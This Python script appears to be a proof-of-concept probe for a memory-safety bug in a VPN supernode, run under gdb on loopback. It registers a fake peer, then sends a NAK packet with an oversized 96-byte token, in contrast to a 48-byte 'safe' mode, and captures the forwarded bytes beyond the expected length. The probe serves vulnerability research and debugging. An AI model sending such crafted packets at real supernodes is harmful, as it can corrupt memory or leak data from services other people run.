#!/usr/bin/env python3
"""W3 probe: register a peer, then send an oversized-token NAK and capture
the forwarding reply. Run under gdb with live/gdb-cmds-w3.txt.

The REGISTER_SUPER comes from a bound loopback socket so `sendto_peer` in
the supernode sends its re-encoded NAK back to that socket. The NAK itself
is sent from a second, unbound socket: HASH_FIND_PEER matches on srcMac.
"""
import socket
import struct
import sys
import time

SN_PORT = int(sys.argv[1])    # supernode main UDP port (gdb run args)
PEER_PORT = int(sys.argv[2])  # locally bound peer socket
MODE = sys.argv[3] if len(sys.argv) > 3 else "attack"
COMMUNITY = b"mynetwork".ljust(20, b"\0")
MAC = bytes([2, 0, 0, 0, 0, 1])
COOKIE = 0x11223344


def common(msg_type):
    return bytes([3, 3]) + struct.pack("!H", msg_type) + COMMUNITY


def recv(sock, seconds):
    sock.settimeout(seconds)
    try:
        return sock.recvfrom(4096)
    except socket.timeout:
        return None


peer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
peer.bind(("127.0.0.1", PEER_PORT))

# Give gdb time to start the inferior before the first datagram.
time.sleep(5)

register = (common(5) + struct.pack("!I", COOKIE) + MAC
            + struct.pack("!I", 0) + bytes([0]) + bytes(16)
            + struct.pack("!HH", 0, 0) + struct.pack("!I", 0))
peer.sendto(register, ("127.0.0.1", SN_PORT))
reply = recv(peer, 4)
if reply is None:
    print("W3: no REGISTER_SUPER reply (peer registration unconfirmed)", flush=True)
else:
    data, addr = reply
    print(f"W3: REGISTER_SUPER reply from {addr} len={len(data)} {data.hex()}",
          flush=True)

time.sleep(1)

token_size = 48 if MODE == "safe" else 96
token = bytes([0x48, 0x5a, 0x4d, 0x49]) * (token_size // 4)
nak = (common(8) + struct.pack("!I", COOKIE) + MAC
       + struct.pack("!HH", 0, token_size) + token)
assert len(nak) == 38 + token_size and nak[23] == 0
sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sender.sendto(nak, ("127.0.0.1", SN_PORT))
sender.close()
print(f"W3: sent {MODE} NAK len={len(nak)} token_size={token_size} "
      f"token[0:4]={token[:4].hex()}", flush=True)
# gdb stops at the post-decode breakpoint and on the watchpoint; keep
# listening across those stops for the forwarded packet.
for i in range(30):
    reply = recv(peer, 1)
    if reply is None:
        continue
    data, addr = reply
    print(f"W3: FORWARDED from {addr} len={len(data)} {data.hex()}",
          flush=True)
    if len(data) >= 38 + token_size:
        # Wire offsets: common 24, cookie 4, mac 6, scheme 2, token_size 2.
        wire_token = data[38:]
        print(f"W3: mode={MODE} wire token len={len(wire_token)} "
              f"first={wire_token[:8].hex()} "
              f"beyond48={wire_token[48:56].hex()}", flush=True)
        break
else:
    print("W3: no forwarded NAK within 30 s", flush=True)
